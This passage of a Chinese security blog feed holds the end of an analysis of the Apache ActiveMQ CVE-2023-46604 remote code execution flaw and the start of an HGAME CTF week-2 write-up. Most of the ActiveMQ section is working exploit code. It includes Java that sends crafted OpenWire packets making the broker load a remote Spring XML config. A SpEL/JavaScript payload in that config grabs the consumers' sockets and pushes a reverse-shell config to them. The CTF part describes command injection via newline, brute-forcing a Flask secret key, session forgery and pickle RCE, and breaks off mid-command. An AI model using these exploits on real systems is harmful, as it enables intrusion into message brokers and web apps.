class="hljs-constructor">ByteArrayOutputStream()</span>;DataOutput dataOutput = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;dataOutput.write<span class="hljs-constructor">Int(0)</span>;dataOutput.write<span class="hljs-constructor">Byte(31)</span>;dataOutput.write<span class="hljs-constructor">Int(1)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">Int(1)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>)</span>;dataOutput.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;http://localhost:8000/abcd&quot;</span>)</span>;Socket socket = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Socket(<span class="hljs-string">&quot;localhost&quot;</span>, 61616)</span>;OutputStream socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);socketOutputStream.close<span class="hljs-literal">()</span>;</code></pre></div><p>socket连接后，根据反序列化逻辑的代码，对应着进行writeInt、writeByte、writeBoolean</p><p>省去发送message过程中marshal的操作，直接进行dounmarshal</p><p>此外作者发现ActiveMQ中存在一个tightEncodingEnabled的配置，启用tightEncodingEnabled配置后，ActiveMQ会使用一种紧凑的消息编码方式，它采用了一些技巧，例如采用更紧凑的数据结构、二进制编码等，以减少消息的大小。</p><p>很明显如果目标启用了tightEncodingEnabled的话，上面的攻击代码肯定需要修改。经过测试发现默认Broker未打开该配置，Consumer打开该配置。</p><p>这里也给出tightEncodingEnabled场景下，攻击Broker的利用代码</p><div class="code-wrapper"><pre><code class="hljs reasonml">ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;DataOutput dataOutput = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;dataOutput.write<span class="hljs-constructor">Int(0)</span>;dataOutput.write<span class="hljs-constructor">Byte(31)</span>;BooleanStream bs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BooleanStream()</span>;bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;bs.marshal(dataOutput);dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;bb&quot;</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;aa&quot;</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>)</span>;dataOutput.write<span class="hljs-constructor">UTF(<span class="hljs-string">&quot;http://localhost:8000/abcd&quot;</span>)</span>;bos.flush<span class="hljs-literal">()</span>;Socket socket =<span class="hljs-keyword">new</span> <span class="hljs-constructor">Socket(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, 61616)</span>;OutputStream socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);socketOutputStream.close<span class="hljs-literal">()</span>;</code></pre></div><h2 id="从broker到consumer"><a href="#从broker到consumer" class="headerlink" title="从broker到consumer"></a>从broker到consumer</h2><p>ActiveMQ有两种常用的消息模型，点对点、发布&#x2F;订阅模式。</p><p>通常会设置一个监听器，同时让消费者和Broker保持长链接。</p><p>那么思路就有了，在控制了Broker后，获取到Broker和消费已建立的Socket链接，给消费推恶意数据进行反序列化按理是可以实现利用的</p><p>是真正意义上的由broker才能到consumer</p><p><code>org.apache.activemq.broker.BrokerRegistry#getInstance</code></p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BrokerRegistry</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> Logger LOG = LoggerFactory.<span class="hljs-built_in">getLogger</span>(BrokerRegistry.<span class="hljs-keyword">class</span>);    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> BrokerRegistry INSTANCE = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BrokerRegistry</span>();    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object mutex = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;<span class="hljs-type">String</span>, BrokerService&gt; brokers = <span class="hljs-keyword">new</span> <span class="hljs-built_in">HashMap</span>();    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BrokerRegistry</span><span class="hljs-params">()</span> </span>&#123;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> BrokerRegistry <span class="hljs-title">getInstance</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> INSTANCE;    &#125;</code></pre></div><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240211014512696.png" alt="image-20240211014512696"></p><p>[Active Transport]即是已经建立的消费链接</p><p>这里通过先让Broker加载远程配置文件在Broker上实现SPEL代码执行后，通过代码执行获取消费者socket推送恶意数据，加载远程配置文件。上面也说到了消费者默认开启了tightEncodingEnabled，所以需要使用tightEncodingEnabled的Exp</p><div class="code-wrapper"><pre><code class="hljs scilab">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span>       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span><span class="hljs-string">            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;</span>&gt;    &lt;context:property-placeholder ignore-resource-not-found=<span class="hljs-string">&quot;false&quot;</span> ignore-unresolvable=<span class="hljs-string">&quot;false&quot;</span>/&gt;    &lt;bean class=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;        &lt;property name=<span class="hljs-string">&quot;String&quot;</span> value=<span class="hljs-string">&quot;#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;</span>js&#x27;).eval(&amp;quot;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getunsafe</span><span class="hljs-params">()</span> &#123;<span class="hljs-title">var</span> <span class="hljs-title">unsafe</span> = <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Class</span>.<span class="hljs-title">forName</span><span class="hljs-params">(&#x27;sun.misc.Unsafe&#x27;)</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;theUnsafe&#x27;)</span>;<span class="hljs-title">unsafe</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;<span class="hljs-title">return</span> <span class="hljs-title">unsafe</span>.<span class="hljs-title">get</span><span class="hljs-params">(null)</span>;&#125; <span class="hljs-title">var</span> <span class="hljs-title">unsafe</span> = <span class="hljs-title">getunsafe</span><span class="hljs-params">()</span>; <span class="hljs-title">brokerRegistry</span> = <span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">activemq</span>.<span class="hljs-title">broker</span>.<span class="hljs-title">BrokerRegistry</span>.<span class="hljs-title">getInstance</span><span class="hljs-params">()</span>;<span class="hljs-title">brokers</span> = <span class="hljs-title">brokerRegistry</span>.<span class="hljs-title">getBrokers</span><span class="hljs-params">()</span>;<span class="hljs-title">for</span><span class="hljs-params">(key in brokers)</span>&#123;   <span class="hljs-title">brokerService</span> = <span class="hljs-title">brokers</span>.<span class="hljs-title">get</span><span class="hljs-params">(key)</span>;  <span class="hljs-title">try</span>&#123; <span class="hljs-title">f</span> = <span class="hljs-title">brokerService</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;shutdownHook&#x27;)</span>; &#125;<span class="hljs-title">catch</span><span class="hljs-params">(e)</span>&#123;<span class="hljs-title">f</span> = <span class="hljs-title">brokerService</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getSuperclass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;shutdownHook&#x27;)</span>;&#125;   <span class="hljs-title">f</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;   <span class="hljs-title">shutdownHook</span> = <span class="hljs-title">f</span>.<span class="hljs-title">get</span><span class="hljs-params">(brokerService)</span>;   <span class="hljs-title">threadGroup</span> = <span class="hljs-title">shutdownHook</span>.<span class="hljs-title">getThreadGroup</span><span class="hljs-params">()</span>;   <span class="hljs-title">f</span> = <span class="hljs-title">threadGroup</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;threads&#x27;)</span>; <span class="hljs-title">threads</span> = <span class="hljs-title">unsafe</span>.<span class="hljs-title">getObject</span><span class="hljs-params">(threadGroup, unsafe.objectFieldOffset(f)</span>); <span class="hljs-title">for</span><span class="hljs-params">(key in threads)</span>&#123;       <span class="hljs-title">thread</span> = <span class="hljs-title">threads</span>[<span class="hljs-title">key</span>];       <span class="hljs-title">if</span><span class="hljs-params">(thread == null)</span>&#123;           <span class="hljs-title">continue</span>;       &#125;       <span class="hljs-title">threadName</span> = <span class="hljs-title">thread</span>.<span class="hljs-title">getName</span><span class="hljs-params">()</span>;       <span class="hljs-title">if</span><span class="hljs-params">(threadName.startsWith(&#x27;ActiveMQ Transport: &#x27;)</span>)&#123;           <span class="hljs-title">f</span> = <span class="hljs-title">thread</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;target&#x27;)</span>;                      <span class="hljs-title">tcpTransport</span> = <span class="hljs-title">unsafe</span>.<span class="hljs-title">getObject</span><span class="hljs-params">(thread, unsafe.objectFieldOffset(f)</span>);           <span class="hljs-title">f</span> = <span class="hljs-title">tcpTransport</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;socket&#x27;)</span>;           <span class="hljs-title">f</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;           <span class="hljs-title">socket</span> = <span class="hljs-title">f</span>.<span class="hljs-title">get</span><span class="hljs-params">(tcpTransport)</span>;           <span class="hljs-title">bos</span> = <span class="hljs-title">new</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">ByteArrayOutputStream</span><span class="hljs-params">()</span>;           <span class="hljs-title">dataOutput</span> = <span class="hljs-title">new</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">DataOutputStream</span><span class="hljs-params">(bos)</span>;           <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeInt</span><span class="hljs-params">(1)</span>;           <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeByte</span><span class="hljs-params">(31)</span>;    <span class="hljs-title">bs</span> = <span class="hljs-title">new</span> <span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">activemq</span>.<span class="hljs-title">openwire</span>.<span class="hljs-title">BooleanStream</span><span class="hljs-params">()</span>;    <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(false)</span>;   <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>; <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(false)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">marshal</span><span class="hljs-params">(dataOutput)</span>; <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;bb&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;aa&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;http://localhost:8000/dddd&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeShort</span><span class="hljs-params">(0)</span>;  <span class="hljs-title">socketOutputStream</span> = <span class="hljs-title">socket</span>.<span class="hljs-title">getOutputStream</span><span class="hljs-params">()</span>;           <span class="hljs-title">socketOutputStream</span>.<span class="hljs-title">write</span><span class="hljs-params">(bos.toByteArray()</span>);         &#125;   &#125;   &#125;&amp;<span class="hljs-title">quot</span>;)&#125;&quot;/&gt;</span>    &lt;/bean&gt;&lt;/beans&gt;</code></pre></div><p>上面意思是使用js代码执行以下代码</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> getunsafe<span class="hljs-literal">()</span> &#123;    var unsafe = java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(&#x27;<span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.Unsafe&#x27;)</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">theUnsafe</span>&#x27;)</span>;    unsafe.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    return unsafe.get(null);&#125;var unsafe = getunsafe<span class="hljs-literal">()</span>;brokerRegistry = org.apache.activemq.broker.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BrokerRegistry</span>.</span></span>get<span class="hljs-constructor">Instance()</span>;brokers = brokerRegistry.get<span class="hljs-constructor">Brokers()</span>;<span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> brokers)&#123;    brokerService = brokers.get(key);    <span class="hljs-keyword">try</span>&#123; f = brokerService.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">shutdownHook</span>&#x27;)</span>;    &#125;    catch(e) &#123;        f = brokerService.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Superclass()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">shutdownHook</span>&#x27;)</span>;    &#125;    f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    shutdownHook = f.get(brokerService);    threadGroup = shutdownHook.get<span class="hljs-constructor">ThreadGroup()</span>;    f = threadGroup.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">threads</span>&#x27;)</span>;    threads = unsafe.get<span class="hljs-constructor">Object(<span class="hljs-params">threadGroup</span>, <span class="hljs-params">unsafe</span>.<span class="hljs-params">objectFieldOffset</span>(<span class="hljs-params">f</span>)</span>);    <span class="hljs-keyword">for</span>(key <span class="hljs-keyword">in</span> threads)&#123;        thread = threads<span class="hljs-literal">[<span class="hljs-identifier">key</span>]</span>;        <span class="hljs-keyword">if</span>(thread<span class="hljs-operator"> == </span>null)&#123;            continue;        &#125;        threadName = thread.get<span class="hljs-constructor">Name()</span>;        <span class="hljs-keyword">if</span>(threadName.starts<span class="hljs-constructor">With(&#x27;ActiveMQ Transport: &#x27;)</span>)&#123;            f = thread.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">target</span>&#x27;)</span>;            tcpTransport = unsafe.get<span class="hljs-constructor">Object(<span class="hljs-params">thread</span>, <span class="hljs-params">unsafe</span>.<span class="hljs-params">objectFieldOffset</span>(<span class="hljs-params">f</span>)</span>);            f = tcpTransport.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(&#x27;<span class="hljs-params">socket</span>&#x27;)</span>;            f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;            socket = f.get(tcpTransport);            bos = <span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">ByteArrayOutputStream()</span>;            dataOutput = <span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">DataOutputStream(<span class="hljs-params">bos</span>)</span>;            dataOutput.write<span class="hljs-constructor">Int(1)</span>;            dataOutput.write<span class="hljs-constructor">Byte(31)</span>;            bs = <span class="hljs-keyword">new</span> org.apache.activemq.openwire.<span class="hljs-constructor">BooleanStream()</span>;            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">true</span>)</span>;            bs.write<span class="hljs-constructor">Boolean(<span class="hljs-params">false</span>)</span>;            bs.marshal(dataOutput);            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">bb</span>&#x27;)</span>;            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">aa</span>&#x27;)</span>;            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">context</span>.<span class="hljs-params">support</span>.ClassPathXmlApplicationContext&#x27;)</span>;            dataOutput.write<span class="hljs-constructor">UTF(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">localhost</span>:8000<span class="hljs-operator">/</span><span class="hljs-params">dddd</span>&#x27;)</span>;            dataOutput.write<span class="hljs-constructor">Short(0)</span>;            socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;            socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);        &#125;    &#125;&#125;</code></pre></div><p>打broker加载的是上面执行js的xml文件，js代码中的是反弹shell的xml文件</p><p>点对点消费测试（ 即点对点模式的长连接代码</p><div class="code-wrapper"><pre><code class="hljs pgsql">ConnectionFactory connectionFactory = <span class="hljs-built_in">new</span> ActiveMQConnectionFactory(ActiveMQConnection.DEFAULT_USER,        ActiveMQConnection.DEFAULT_PASSWORD, &quot;tcp://localhost:61616&quot;);<span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span> = connectionFactory.createConnection();<span class="hljs-keyword">connection</span>.<span class="hljs-keyword">start</span>();<span class="hljs-keyword">Session</span> <span class="hljs-keyword">session</span> = <span class="hljs-keyword">connection</span>.createSession(<span class="hljs-keyword">false</span>, <span class="hljs-keyword">Session</span>.AUTO_ACKNOWLEDGE);Destination destination = <span class="hljs-keyword">session</span>.createQueue(&quot;tempQueue&quot;);MessageConsumer consumer = <span class="hljs-keyword">session</span>.createConsumer(destination);consumer.setMessageListener(<span class="hljs-built_in">new</span> MessageListener() &#123;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> onMessage(Message message) &#123;        try &#123;            message.acknowledge();            TextMessage om = (TextMessage) message;            String data = om.getText();            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(data);        &#125; catch (JMSException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;);<span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();<span class="hljs-keyword">session</span>.<span class="hljs-keyword">close</span>();<span class="hljs-keyword">connection</span>.<span class="hljs-keyword">close</span>();</code></pre></div><p>发布&#x2F;订阅消费测试 （即主题&#x2F;订阅模式长连接代码</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TopicConsumer</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> JMSException, IOException &#123;        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-type">MessageConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            factory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveMQConnectionFactory</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;tcp://localhost:61616&quot;</span>);            connection = factory.createConnection();            connection.start();            session = connection.createSession(<span class="hljs-literal">false</span>, Session.AUTO_ACKNOWLEDGE);            <span class="hljs-type">Destination</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> session.createTopic(TopicProducer.QUEUE_NAME);            consumer = session.createConsumer(destination);                       consumer.setMessageListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageListener</span>() &#123;                <span class="hljs-meta">@Override</span>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(Message message)</span> &#123;                    <span class="hljs-keyword">try</span> &#123;                        <span class="hljs-type">TextMessage</span> <span class="hljs-variable">om</span> <span class="hljs-operator">=</span> (TextMessage) message;                        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> om.getText();                        System.out.println(data);                    &#125; <span class="hljs-keyword">catch</span> (JMSException e) &#123;                        e.printStackTrace();                    &#125;                &#125;            &#125;);        &#125; <span class="hljs-keyword">catch</span>(Exception ex)&#123;            <span class="hljs-keyword">throw</span> ex;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;        <span class="hljs-type">TopicConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TopicConsumer</span>();        <span class="hljs-keyword">try</span>&#123;            consumer.consumer();        &#125; <span class="hljs-keyword">catch</span> (Exception ex)&#123;            ex.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><p>存在其中一个长连接代码即可</p><p><img src="/../images/%E5%AD%A6%E4%B9%A0ActiveMQ%E5%B0%8F%E4%BA%8E5-18-3%E7%9A%84RCE/image-20240211024029722.png" alt="image-20240211024029722"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>服了，本来想调试一遍的，我好不容易弄好了服务端，结果运行client端那个demo的jdk版本好像不够报错，换了比jdk11还高的jdk17也没什么用，还是报错，服了</p><p>算了算了</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/</a></p><p><a href="https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/">https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.yulegeyu.com/">雨了个雨’s blog (yulegeyu.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-WEEK2</title>
    <link href="/2024/02/07/HGAME-WEEK2/"/>
    <url>/2024/02/07/HGAME-WEEK2/</url>
    
    <content type="html"><![CDATA[<h1 id="week-2"><a href="#week-2" class="headerlink" title="week 2"></a>week 2</h1><p>web 2&#x2F;5 完了，废了</p><p><img src="/../images/HGAME-WEEK2/image-20240215210113814.png" alt="image-20240215210113814"></p><h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><p>像ping那种命令执行，就是执行多个命令，禁用<code>&amp; | ;</code></p><p>我是用%0a来换行</p><p><img src="/../images/HGAME-WEEK2/image-20240205212151120.png" alt="image-20240205212151120"></p><p>WP的做法是使用反引号，也有人用<code>$()</code></p><h2 id="myflask-（三血"><a href="#myflask-（三血" class="headerlink" title="myflask （三血"></a>myflask （三血</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezonecurrentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)app = Flask(__name__)<span class="hljs-comment"># Tips: Try to crack this first ↓</span>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<span class="hljs-built_in">print</span>(currentTime)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])        <span class="hljs-comment"># For POST requests from admin</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))        <span class="hljs-comment"># Tips: Here try to trigger RCE</span>        userdata=pickle.loads(pickle_data)        <span class="hljs-keyword">return</span> userdata    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span> <span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)</code></pre></div><p>看到secret_key是一个时间的函数</p><p>本地运行一下看大概是多少（我这里是20xxxx忘记了，然后把上下范围大概写入文件中</p><div class="code-wrapper"><pre><code class="hljs stylus">with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)as f:    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200000</span>,<span class="hljs-number">210000</span>):        f<span class="hljs-selector-class">.write</span>(<span class="hljs-built_in">str</span>(i))        f<span class="hljs-selector-class">.write</span>(<span class="hljs-string">&quot;\n&quot;</span>)</code></pre></div><p>用flask-unsign指定字典爆破</p><p><img src="/../images/HGAME-WEEK2/image-20240206010314307.png" alt="image-20240206010314307"></p><p>伪造session成为admin</p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> flask-session.<span class="hljs-keyword">py</span> encode -s <span class="hljs-string">&quot;203849&quot;</span> -t <span 